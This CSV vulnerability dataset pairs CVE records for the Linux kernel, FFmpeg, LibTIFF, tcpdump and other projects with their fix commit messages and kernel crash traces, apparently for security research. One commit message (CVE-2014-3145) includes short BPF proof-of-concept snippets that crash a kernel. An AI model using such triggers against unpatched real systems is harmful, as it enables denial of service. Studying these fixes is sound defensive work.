CVE-2017-9994,CWE-119,2017-06-28,"libavcodec/webp.c in FFmpeg before 2.8.12, 3.0.x before 3.0.8, 3.1.x before 3.1.8, 3.2.x before 3.2.5, and 3.3.x before 3.3.1 does not ensure that pix_fmt is set, which allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file, related to the vp8_decode_mb_row_no_filter and pred8x8_128_dc_8_c functions.","Fixes: out of array access Fixes: 1434/clusterfuzz-testcase-minimized-6314998085189632 Fixes: 1435/clusterfuzz-testcase-minimized-6483783723253760  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg Reviewed-by: ""Ronald S. Bultje"" <rsbultje@gmail.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2014-3145,CWE-125,2014-05-11,"The BPF_S_ANC_NLATTR_NEST extension implementation in the sk_run_filter function in net/core/filter.c in the Linux kernel through 3.14.3 uses the reverse order in a certain subtraction, which allows local users to cause a denial of service (over-read and system crash) via crafted BPF instructions.  NOTE: the affected code was moved to the __skb_get_nlattr_nest function before the vulnerability was announced.","The BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check for a minimal message length before testing the supplied offset to be within the bounds of the message. This allows the subtraction of the nla header to underflow and therefore -- as the data type is unsigned -- allowing far to big offset and length values for the search of the netlink attribute.  The remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is also wrong. It has the minuend and subtrahend mixed up, therefore calculates a huge length value, allowing to overrun the end of the message while looking for the netlink attribute.  The following three BPF snippets will trigger the bugs when attached to a UNIX datagram socket and parsing a message with length 1, 2 or 3.   ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--  | ld	#0x87654321  | ldx	#42  | ld	#nla  | ret	a  `---   ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--  | ld	#0x87654321  | ldx	#42  | ld	#nlan  | ret	a  `---   ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--  | ; (needs a fake netlink header at offset 0)  | ld	#0  | ldx	#42  | ld	#nlan  | ret	a  `---  Fix the first issue by ensuring the message length fulfills the minimal size constrains of a nla header. Fix the second bug by getting the math for the remainder calculation right.  Fixes: 4738c1d (""[SKFILTER]: Add SKF_ADF_NLATTR instruction"") Fixes: d214c75 (""filter: add SKF_AD_NLATTR_NEST to look for nested.."") Cc: Patrick McHardy <kaber@trash.net> Cc: Pablo Neira Ayuso <pablo@netfilter.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-0239,CWE-269,2015-03-02,"The em_sysenter function in arch/x86/kvm/emulate.c in the Linux kernel before 3.18.5, when the guest OS lacks SYSENTER MSR initialization, allows guest OS users to gain guest OS privileges or cause a denial of service (guest OS crash) by triggering use of a 16-bit code segment for emulation of a SYSENTER instruction.",SYSENTER emulation is broken in several ways: 1. It misses the case of 16-bit code segments completely (CVE-2015-0239). 2. MSR_IA32_SYSENTER_CS is checked in 64-bit mode incorrectly (bits 0 and 1 can    still be set without causing #GP). 3. MSR_IA32_SYSENTER_EIP and MSR_IA32_SYSENTER_ESP are not masked in    legacy-mode. 4. There is some unneeded code.  Fix it.  Cc: stable@vger.linux.org Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>
CVE-2011-1023,,2012-06-21,"The Reliable Datagram Sockets (RDS) subsystem in the Linux kernel before 2.6.38 does not properly handle congestion map updates, which allows local users to cause a denial of service (BUG_ON and system crash) via vectors involving (1) a loopback (aka loop) transmit operation or (2) an InfiniBand (aka ib) transmit operation.","Recently had this bug halt reported to me:  kernel BUG at net/rds/send.c:329! Oops: Exception in kernel mode, sig: 5 [#1] SMP NR_CPUS=1024 NUMA pSeries Modules linked in: rds sunrpc ipv6 dm_mirror dm_region_hash dm_log ibmveth sg ext4 jbd2 mbcache sd_mod crc_t10dif ibmvscsic scsi_transport_srp scsi_tgt dm_mod [last unloaded: scsi_wait_scan] NIP: d000000003ca68f4 LR: d000000003ca67fc CTR: d000000003ca8770 REGS: c000000175cab980 TRAP: 0700   Not tainted  (2.6.32-118.el6.ppc64) MSR: 8000000000029032 <EE,ME,CE,IR,DR>  CR: 44000022  XER: 00000000 TASK = c00000017586ec90[1896] 'krdsd' THREAD: c000000175ca8000 CPU: 0 GPR00: 0000000000000150 c000000175cabc00 d000000003cb7340 0000000000002030 GPR04: ffffffffffffffff 0000000000000030 0000000000000000 0000000000000030 GPR08: 0000000000000001 0000000000000001 c0000001756b1e30 0000000000010000 GPR12: d000000003caac90 c000000000fa2500 c0000001742b2858 c0000001742b2a00 GPR16: c0000001742b2a08 c0000001742b2820 0000000000000001 0000000000000001 GPR20: 0000000000000040 c0000001742b2814 c000000175cabc70 0800000000000000 GPR24: 0000000000000004 0200000000000000 0000000000000000 c0000001742b2860 GPR28: 0000000000000000 c0000001756b1c80 d000000003cb68e8 c0000001742b27b8 NIP [d000000003ca68f4] .rds_send_xmit+0x4c4/0x8a0 [rds] LR [d000000003ca67fc] .rds_send_xmit+0x3cc/0x8a0 [rds] Call Trace: [c000000175cabc00] [d000000003ca67fc] .rds_send_xmit+0x3cc/0x8a0 [rds] (unreliable) [c000000175cabd30] [d000000003ca7e64] .rds_send_worker+0x54/0x100 [rds] [c000000175cabdb0] [c0000000000b475c] .worker_thread+0x1dc/0x3c0 [c000000175cabed0] [c0000000000baa9c] .kthread+0xbc/0xd0 [c000000175cabf90] [c000000000032114] .kernel_thread+0x54/0x70 Instruction dump: 4bfffd50 60000000 60000000 39080001 935f004c f91f0040 41820024 813d017c 7d094a78 7d29007 7929d182 394a0020 <0b090000> 40e2ff68 4bffffa4 39200000 Kernel panic - not syncing: Fatal exception Call Trace: [c000000175cab560] [c000000000012e04] .show_stack+0x74/0x1c0 (unreliable) [c000000175cab610] [c0000000005a365c] .panic+0x80/0x1b4 [c000000175cab6a0] [c00000000002fbcc] .die+0x21c/0x2a0 [c000000175cab750] [c000000000030000] ._exception+0x110/0x220 [c000000175cab910] [c000000000004b9c] program_check_common+0x11c/0x180  Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-9004,CWE-264,2017-05-02,"kernel/events/core.c in the Linux kernel before 3.19 mishandles counter grouping, which allows local users to gain privileges via a crafted application, related to the perf_pmu_register and perf_event_open functions.","The fix from 9fc81d8 (""perf: Fix events installation during moving group"") was incomplete in that it failed to recognise that creating a group with events for different CPUs is semantically broken -- they cannot be co-scheduled.  Furthermore, it leads to real breakage where, when we create an event for CPU Y and then migrate it to form a group on CPU X, the code gets confused where the counter is programmed -- triggered in practice as well by me via the perf fuzzer.  Fix this by tightening the rules for creating groups. Only allow grouping of counters that can be co-scheduled in the same context. This means for the same task and/or the same cpu.  Fixes: 9fc81d8 (""perf: Fix events installation during moving group"") Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Arnaldo Carvalho de Melo <acme@kernel.org> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Link: http://lkml.kernel.org/r/20150123125834.090683288@infradead.org Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2013-7271,CWE-20,2014-01-06,"The x25_recvmsg function in net/x25/af_x25.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","This patch now always passes msg->msg_namelen as 0. recvmsg handlers must set msg_namelen to the proper size <= sizeof(struct sockaddr_storage) to return msg_name to the user.  This prevents numerous uninitialized memory leaks we had in the recvmsg handlers and makes it harder for new code to accidentally leak uninitialized memory.  Optimize for the case recvfrom is called with NULL as address. We don't need to copy the address at all, so set it to NULL before invoking the recvmsg handler. We can do so, because all the recvmsg handlers must cope with the case a plain read() is called on them. read() also sets msg_name to NULL.  Also document these changes in include/linux/net.h as suggested by David Miller.  Changes since RFC:  Set msg->msg_name = NULL if user specified a NULL in msg_name but had a non-null msg_namelen in verify_iovec/verify_compat_iovec. This doesn't affect sendto as it would bail out earlier while trying to copy-in the address. It also more naturally reflects the logic by the callers of verify_iovec.  With this change in place I could remove "" if (!uaddr || msg_sys->msg_namelen == 0) 	msg->msg_name = NULL "".  This change does not alter the user visible error logic as we ignore msg_namelen as long as msg_name is NULL.  Also remove two unnecessary curly brackets in ___sys_recvmsg and change comments to netdev style.  Cc: David Miller <davem@davemloft.net> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-9016,CWE-264,2018-04-05,"In blk_mq_tag_to_rq in blk-mq.c in the upstream kernel, there is a possible use after free due to a race condition when a request has been previously freed by blk_mq_complete_request. This could lead to local escalation of privilege. Product: Android. Versions: Android kernel. Android ID: A-63083046.","Inside timeout handler, blk_mq_tag_to_rq() is called to retrieve the request from one tag. This way is obviously wrong because the request can be freed any time and some fiedds of the request can't be trusted, then kernel oops might be triggered[1].  Currently wrt. blk_mq_tag_to_rq(), the only special case is that the flush request can share same tag with the request cloned from, and the two requests can't be active at the same time, so this patch fixes the above issue by updating tags->rqs[tag] with the active request(either flush rq or the request cloned from) of the tag.  Also blk_mq_tag_to_rq() gets much simplified with this patch.  Given blk_mq_tag_to_rq() is mainly for drivers and the caller must make sure the request can't be freed, so in bt_for_each() this helper is replaced with tags->rqs[tag].  [1] kernel oops log [  439.696220] BUG: unable to handle kernel NULL pointer dereference at 0000000000000158^M [  439.697162] IP: [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21/0x6e^M [  439.700653] PGD 7ef765067 PUD 7ef764067 PMD 0 ^M [  439.700653] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC ^M [  439.700653] Dumping ftrace buffer:^M [  439.700653]    (ftrace buffer empty)^M [  439.700653] Modules linked in: nbd ipv6 kvm_intel kvm serio_raw^M [  439.700653] CPU: 6 PID: 2779 Comm: stress-ng-sigfd Not tainted 4.2.0-rc5-next-20150805+ #265^M [  439.730500] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011^M [  439.730500] task: ffff880605308000 ti: ffff88060530c000 task.ti: ffff88060530c000^M [  439.730500] RIP: 0010:[<ffffffff812d89ba>]  [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21/0x6e^M [  439.730500] RSP: 0018:ffff880819203da0  EFLAGS: 00010283^M [  439.730500] RAX: ffff880811b0e000 RBX: ffff8800bb465f00 RCX: 0000000000000002^M [  439.730500] RDX: 0000000000000000 RSI: 0000000000000202 RDI: 0000000000000000^M [  439.730500] RBP: ffff880819203db0 R08: 0000000000000002 R09: 0000000000000000^M [  439.730500] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000202^M [  439.730500] R13: ffff880814104800 R14: 0000000000000002 R15: ffff880811a2ea00^M [  439.730500] FS:  00007f165b3f5740(0000) GS:ffff880819200000(0000) knlGS:0000000000000000^M [  439.730500] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b^M [  439.730500] CR2: 0000000000000158 CR3: 00000007ef766000 CR4: 00000000000006e0^M [  439.730500] Stack:^M [  439.730500]  0000000000000008 ffff8808114eed90 ffff880819203e00 ffffffff812dc104^M [  439.755663]  ffff880819203e40 ffffffff812d9f5e 0000020000000000 ffff8808114eed80^M [  439.755663] Call Trace:^M [  439.755663]  <IRQ> ^M [  439.755663]  [<ffffffff812dc104>] bt_for_each+0x6e/0xc8^M [  439.755663]  [<ffffffff812d9f5e>] ? blk_mq_rq_timed_out+0x6a/0x6a^M [  439.755663]  [<ffffffff812d9f5e>] ? blk_mq_rq_timed_out+0x6a/0x6a^M [  439.755663]  [<ffffffff812dc1b3>] blk_mq_tag_busy_iter+0x55/0x5e^M [  439.755663]  [<ffffffff812d88b4>] ? blk_mq_bio_to_request+0x38/0x38^M [  439.755663]  [<ffffffff812d8911>] blk_mq_rq_timer+0x5d/0xd4^M [  439.755663]  [<ffffffff810a3e10>] call_timer_fn+0xf7/0x284^M [  439.755663]  [<ffffffff810a3d1e>] ? call_timer_fn+0x5/0x284^M [  439.755663]  [<ffffffff812d88b4>] ? blk_mq_bio_to_request+0x38/0x38^M [  439.755663]  [<ffffffff810a46d6>] run_timer_softirq+0x1ce/0x1f8^M [  439.755663]  [<ffffffff8104c367>] __do_softirq+0x181/0x3a4^M [  439.755663]  [<ffffffff8104c76e>] irq_exit+0x40/0x94^M [  439.755663]  [<ffffffff81031482>] smp_apic_timer_interrupt+0x33/0x3e^M [  439.755663]  [<ffffffff815559a4>] apic_timer_interrupt+0x84/0x90^M [  439.755663]  <EOI> ^M [  439.755663]  [<ffffffff81554350>] ? _raw_spin_unlock_irq+0x32/0x4a^M [  439.755663]  [<ffffffff8106a98b>] finish_task_switch+0xe0/0x163^M [  439.755663]  [<ffffffff8106a94d>] ? finish_task_switch+0xa2/0x163^M [  439.755663]  [<ffffffff81550066>] __schedule+0x469/0x6cd^M [  439.755663]  [<ffffffff8155039b>] schedule+0x82/0x9a^M [  439.789267]  [<ffffffff8119b28b>] signalfd_read+0x186/0x49a^M [  439.790911]  [<ffffffff8106d86a>] ? wake_up_q+0x47/0x47^M [  439.790911]  [<ffffffff811618c2>] __vfs_read+0x28/0x9f^M [  439.790911]  [<ffffffff8117a289>] ? __fget_light+0x4d/0x74^M [  439.790911]  [<ffffffff811620a7>] vfs_read+0x7a/0xc6^M [  439.790911]  [<ffffffff8116292b>] SyS_read+0x49/0x7f^M [  439.790911]  [<ffffffff81554c17>] entry_SYSCALL_64_fastpath+0x12/0x6f^M [  439.790911] Code: 48 89 e5 e8 a9 b8 e7 ff 5d c3 0f 1f 44 00 00 55 89 f2 48 89 e5 41 54 41 89 f4 53 48 8b 47 60 48 8b 1c d0 48 8b 7b 30 48 8b 53 38 <48> 8b 87 58 01 00 00 48 85 c0 75 09 48 8b 97 88 0c 00 00 eb 10 ^M [  439.790911] RIP  [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21/0x6e^M [  439.790911]  RSP <ffff880819203da0>^M [  439.790911] CR2: 0000000000000158^M [  439.790911] ---[ end trace d40af58949325661 ]---^M  Cc: <stable@vger.kernel.org> Signed-off-by: Ming Lei <ming.lei@canonical.com> Signed-off-by: Jens Axboe <axboe@fb.com>"
CVE-2014-2739,CWE-20,2014-04-14,"The cma_req_handler function in drivers/infiniband/core/cma.c in the Linux kernel 3.14.x through 3.14.1 attempts to resolve an RDMA over Converged Ethernet (aka RoCE) address that is properly resolved within a different module, which allows remote attackers to cause a denial of service (incorrect pointer dereference and system crash) via crafted network traffic.","The code that resolves the passive side source MAC within the rdma_cm connection request handler was both redundant and buggy, so remove it.  It was redundant since later, when an RC QP is modified to RTR state, the resolution will take place in the ib_core module.  It was buggy because this callback also deals with UD SIDR exchange, for which we incorrectly looked at the REQ member of the CM event and dereferenced a random value.  Fixes: dd5f03b (""IB/core: Ethernet L2 attributes in verbs/cm structures"") Signed-off-by: Moni Shoua <monis@mellanox.com> Signed-off-by: Or Gerlitz <ogerlitz@mellanox.com> Signed-off-by: Roland Dreier <roland@purestorage.com>"
CVE-2017-9304,CWE-674,2017-05-31,libyara/re.c in the regexp module in YARA 3.5.0 allows remote attackers to cause a denial of service (stack consumption) via a crafted rule that is mishandled in the _yr_re_emit function.,
CVE-2018-14363,CWE-22,2018-07-17,An issue was discovered in NeoMutt before 2018-07-16. newsrc.c does not properly restrict '/' characters that may have unsafe interaction with cache pathnames.,Co-authored-by: JerikoOne <jeriko.one@gmx.us>
CVE-2018-16641,CWE-772,2018-09-06,ImageMagick 7.0.8-6 has a memory leak vulnerability in the TIFFWritePhotoshopLayers function in coders/tiff.c.,
CVE-2019-15922,CWE-476,2019-09-04,An issue was discovered in the Linux kernel before 5.0.9. There is a NULL pointer dereference for a pf data structure if alloc_disk fails in drivers/block/paride/pf.c.,"Syzkaller report this:  pf: pf version 1.04, major 47, cluster 64, nice 0 pf: No ATAPI disk detected kasan: CONFIG_KASAN_INLINE enabled kasan: GPF could be caused by NULL-ptr deref or user memory access general protection fault: 0000 [#1] SMP KASAN PTI CPU: 0 PID: 9887 Comm: syz-executor.0 Tainted: G         C        5.1.0-rc3+ #8 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014 RIP: 0010:pf_init+0x7af/0x1000 [pf] Code: 46 77 d2 48 89 d8 48 c1 e8 03 80 3c 28 00 74 08 48 89 df e8 03 25 a6 d2 4c 8b 23 49 8d bc 24 80 05 00 00 48 89 f8 48 c1 e8 03 <80> 3c 28 00 74 05 e8 e6 24 a6 d2 49 8b bc 24 80 05 00 00 e8 79 34 RSP: 0018:ffff8881abcbf998 EFLAGS: 00010202 RAX: 00000000000000b0 RBX: ffffffffc1e4a8a8 RCX: ffffffffaec50788 RDX: 0000000000039b10 RSI: ffffc9000153c000 RDI: 0000000000000580 RBP: dffffc0000000000 R08: ffffed103ee44e59 R09: ffffed103ee44e59 R10: 0000000000000001 R11: ffffed103ee44e58 R12: 0000000000000000 R13: ffffffffc1e4b028 R14: 0000000000000000 R15: 0000000000000020 FS:  00007f1b78a91700(0000) GS:ffff8881f7200000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 00007f6d72b207f8 CR3: 00000001d5790004 CR4: 00000000007606f0 DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400 PKRU: 55555554 Call Trace:  ? 0xffffffffc1e50000  do_one_initcall+0xbc/0x47d init/main.c:901  do_init_module+0x1b5/0x547 kernel/module.c:3456  load_module+0x6405/0x8c10 kernel/module.c:3804  __do_sys_finit_module+0x162/0x190 kernel/module.c:3898  do_syscall_64+0x9f/0x450 arch/x86/entry/common.c:290  entry_SYSCALL_64_after_hwframe+0x49/0xbe RIP: 0033:0x462e99 Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48 RSP: 002b:00007f1b78a90c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139 RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99 RDX: 0000000000000000 RSI: 0000000020000180 RDI: 0000000000000003 RBP: 00007f1b78a90c70 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000000 R11: 0000000000000246 R12: 00007f1b78a916bc R13: 00000000004bcefa R14: 00000000006f6fb0 R15: 0000000000000004 Modules linked in: pf(+) paride gpio_tps65218 tps65218 i2c_cht_wc ati_remote dc395x act_meta_skbtcindex act_ife ife ecdh_generic rc_xbox_dvd sky81452_regulator v4l2_fwnode leds_blinkm snd_usb_hiface comedi(C) aes_ti slhc cfi_cmdset_0020 mtd cfi_util sx8654 mdio_gpio of_mdio fixed_phy mdio_bitbang libphy alcor_pci matrix_keymap hid_uclogic usbhid scsi_transport_fc videobuf2_v4l2 videobuf2_dma_sg snd_soc_pcm179x_spi snd_soc_pcm179x_codec i2c_demux_pinctrl mdev snd_indigodj isl6405 mii enc28j60 cmac adt7316_i2c(C) adt7316(C) fmc_trivial fmc nf_reject_ipv4 authenc rc_dtt200u rtc_ds1672 dvb_usb_dibusb_mc dvb_usb_dibusb_mc_common dib3000mc dibx000_common dvb_usb_dibusb_common dvb_usb dvb_core videobuf2_common videobuf2_vmalloc videobuf2_memops regulator_haptic adf7242 mac802154 ieee802154 s5h1409 da9034_ts snd_intel8x0m wmi cx24120 usbcore sdhci_cadence sdhci_pltfm sdhci mmc_core joydev i2c_algo_bit scsi_transport_iscsi iscsi_boot_sysfs ves1820 lockd grace nfs_acl auth_rpcgss sunrp  c  ip_vs snd_soc_adau7002 snd_cs4281 snd_rawmidi gameport snd_opl3_lib snd_seq_device snd_hwdep snd_ac97_codec ad7418 hid_primax hid snd_soc_cs4265 snd_soc_core snd_pcm_dmaengine snd_pcm snd_timer ac97_bus snd_compress snd soundcore ti_adc108s102 eeprom_93cx6 i2c_algo_pca mlxreg_hotplug st_pressure st_sensors industrialio_triggered_buffer kfifo_buf industrialio v4l2_common videodev media snd_soc_adau_utils rc_pinnacle_grey rc_core pps_gpio leds_lm3692x nandcore ledtrig_pattern iptable_security iptable_raw iptable_mangle iptable_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 iptable_filter bpfilter ip6_vti ip_vti ip_gre ipip sit tunnel4 ip_tunnel hsr veth netdevsim vxcan batman_adv cfg80211 rfkill chnl_net caif nlmon dummy team bonding vcan bridge stp llc ip6_gre gre ip6_tunnel tunnel6 tun mousedev ppdev tpm kvm_intel kvm irqbypass crct10dif_pclmul crc32_pclmul crc32c_intel ghash_clmulni_intel aesni_intel ide_pci_generic aes_x86_64 piix crypto_simd input_leds psmouse cryp  td  glue_helper ide_core intel_agp serio_raw intel_gtt agpgart ata_generic i2c_piix4 pata_acpi parport_pc parport rtc_cmos floppy sch_fq_codel ip_tables x_tables sha1_ssse3 sha1_generic ipv6 [last unloaded: paride] Dumping ftrace buffer:   (ftrace buffer empty) ---[ end trace 7a818cf5f210d79e ]---  If alloc_disk fails in pf_init_units, pf->disk will be NULL, however in pf_detect and pf_exit, it's not check this before free.It may result a NULL pointer dereference.  Also when register_blkdev failed, blk_cleanup_queue() and blk_mq_free_tag_set() should be called to free resources.  Reported-by: Hulk Robot <hulkci@huawei.com> Fixes: 6ce5902 (""paride/pf: cleanup queues when detection fails"") Signed-off-by: YueHaibing <yuehaibing@huawei.com>  Signed-off-by: Jens Axboe <axboe@kernel.dk>"
CVE-2013-7019,CWE-20,2013-12-09,"The get_cox function in libavcodec/jpeg2000dec.c in FFmpeg before 2.1 does not properly validate the reduction factor, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.",Fixes out of array accesses Fixes Ticket2898  Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2016-5314,CWE-787,2018-03-12,"Buffer overflow in the PixarLogDecode function in tif_pixarlog.c in LibTIFF 4.0.6 and earlier allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted TIFF image, as demonstrated by overwriting the vgetparent function pointer with rgb2ycbcr.",PixarLogDecode() on corrupted/unexpected images (reported by Mathias Svensson)
CVE-2018-14680,CWE-20,2018-07-28,An issue was discovered in mspack/chmd.c in libmspack before 0.7alpha. It does not reject blank CHM filenames.,reject empty filenames. Thanks to Hanno Böck for reporting
CVE-2016-7144,CWE-287,2017-01-18,The m_authenticate function in modules/m_sasl.c in UnrealIRCd before 3.2.10.7 and 4.x before 4.0.6 allows remote attackers to spoof certificate fingerprints and consequently log in as another user via a crafted AUTHENTICATE parameter.,
CVE-2016-9084,CWE-190,2016-11-28,"drivers/vfio/pci/vfio_pci_intrs.c in the Linux kernel through 4.8.11 misuses the kzalloc function, which allows local users to cause a denial of service (integer overflow) or have unspecified other impact by leveraging access to a vfio PCI device file.","The VFIO_DEVICE_SET_IRQS ioctl did not sufficiently sanitize user-supplied integers, potentially allowing memory corruption. This patch adds appropriate integer overflow checks, checks the range bounds for VFIO_IRQ_SET_DATA_NONE, and also verifies that only single element in the VFIO_IRQ_SET_DATA_TYPE_MASK bitmask is set. VFIO_IRQ_SET_ACTION_TYPE_MASK is already correctly checked later in vfio_pci_set_irqs_ioctl().  Furthermore, a kzalloc is changed to a kcalloc because the use of a kzalloc with an integer multiplication allowed an integer overflow condition to be reached without this patch. kcalloc checks for overflow and should prevent a similar occurrence.  Signed-off-by: Vlad Tsyrklevich <vlad@tsyrklevich.net> Signed-off-by: Alex Williamson <alex.williamson@redhat.com>"
CVE-2014-8172,CWE-17,2015-03-16,"The filesystem implementation in the Linux kernel before 3.13 performs certain operations on lists of files with an inappropriate locking approach, which allows local users to cause a denial of service (soft lockup or system crash) via unspecified use of Asynchronous I/O (AIO) operations.",The only thing we need it for is alt-sysrq-r (emergency remount r/o) and these days we can do just as well without going through the list of files.  Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>
CVE-2017-8065,CWE-119,2017-04-23,"crypto/ccm.c in the Linux kernel 4.9.x and 4.10.x through 4.10.12 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","Commit f15f05b (""crypto: ccm - switch to separate cbcmac driver"") refactored the CCM driver to allow separate implementations of the underlying MAC to be provided by a platform. However, in doing so, it moved some data from the linear region to the stack, which violates the SG constraints when the stack is virtually mapped.  So move idata/odata back to the request ctx struct, of which we can reasonably expect that it has been allocated using kmalloc() et al.  Reported-by: Johannes Berg <johannes@sipsolutions.net> Fixes: f15f05b (""crypto: ccm - switch to separate cbcmac driver"") Signed-off-by: Ard Biesheuvel <ard.biesheuvel@linaro.org> Tested-by: Johannes Berg <johannes@sipsolutions.net> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2016-7117,CWE-19,2016-10-10,Use-after-free vulnerability in the __sys_recvmmsg function in net/socket.c in the Linux kernel before 4.5.2 allows remote attackers to execute arbitrary code via vectors involving a recvmmsg system call that is mishandled during error processing.,"The syzkaller fuzzer hit the following use-after-free:    Call Trace:    [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295    [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261    [<     inline     >] SYSC_recvmmsg net/socket.c:2281    [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270    [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a   arch/x86/entry/entry_64.S:185  And, as Dmitry rightly assessed, that is because we can drop the reference and then touch it when the underlying recvmsg calls return some packets and then hit an error, which will make recvmmsg to set sock->sk->sk_err, oops, fix it.  Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: Alexander Potapenko <glider@google.com> Cc: Eric Dumazet <edumazet@google.com> Cc: Kostya Serebryany <kcc@google.com> Cc: Sasha Levin <sasha.levin@oracle.com> Fixes: a2e2725 (""net: Introduce recvmmsg socket syscall"") http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-19199,CWE-190,2018-11-12,An issue was discovered in uriparser before 0.9.0. UriQuery.c allows an integer overflow via a uriComposeQuery* or uriComposeQueryEx* function because of an unchecked multiplication.,
CVE-2016-4008,CWE-399,2016-05-05,"The _asn1_extract_der_octet function in lib/decoding.c in GNU Libtasn1 before 4.8, when used without the ASN1_DECODE_FLAG_STRICT_DER flag, allows remote attackers to cause a denial of service (infinite recursion) via a crafted certificate.",
CVE-2016-7416,CWE-119,2016-09-17,"ext/intl/msgformat/msgformat_format.c in PHP before 5.6.26 and 7.x before 7.0.11 does not properly restrict the locale length provided to the Locale class in the ICU library, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a MessageFormatter::formatMessage call with a long first argument.",
CVE-2016-4569,CWE-200,2016-05-23,"The snd_timer_user_params function in sound/core/timer.c in the Linux kernel through 4.6 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via crafted use of the ALSA timer interface.",The stack object “tread” has a total size of 32 bytes. Its field “event” and “val” both contain 4 bytes padding. These 8 bytes padding bytes are sent to user without being initialized.  Signed-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: Takashi Iwai <tiwai@suse.de>
CVE-2019-15166,CWE-120,2019-10-03,lmp_print_data_link_subobjs() in print-lmp.c in tcpdump before 4.9.3 lacks certain bounds checks.,"In lmp_print_data_link_subobjs(), these problems were identified through code review.  Moreover: Add and use tstr[]. Update two tests outputs accordingly."
CVE-2012-6541,CWE-200,2013-03-15,"The ccid3_hc_tx_getsockopt function in net/dccp/ccids/ccid3.c in the Linux kernel before 3.6 does not initialize a certain structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.",The CCID3 code fails to initialize the trailing padding bytes of struct tfrc_tx_info added for alignment on 64 bit architectures. It that for potentially leaks four bytes kernel stack via the getsockopt() syscall. Add an explicit memset(0) before filling the structure to avoid the info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Gerrit Renker <gerrit@erg.abdn.ac.uk> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2012-6540,CWE-200,2013-03-15,"The do_ip_vs_get_ctl function in net/netfilter/ipvs/ip_vs_ctl.c in the Linux kernel before 3.6 does not initialize a certain structure for IP_VS_SO_GET_TIMEOUT commands, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","If at least one of CONFIG_IP_VS_PROTO_TCP or CONFIG_IP_VS_PROTO_UDP is not set, __ip_vs_get_timeouts() does not fully initialize the structure that gets copied to userland and that for leaks up to 12 bytes of kernel stack. Add an explicit memset(0) before passing the structure to __ip_vs_get_timeouts() to avoid the info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Wensong Zhang <wensong@linux-vs.org> Cc: Simon Horman <horms@verge.net.au> Cc: Julian Anastasov <ja@ssi.bg> Signed-off-by: David S. Miller <davem@davemloft.net>"
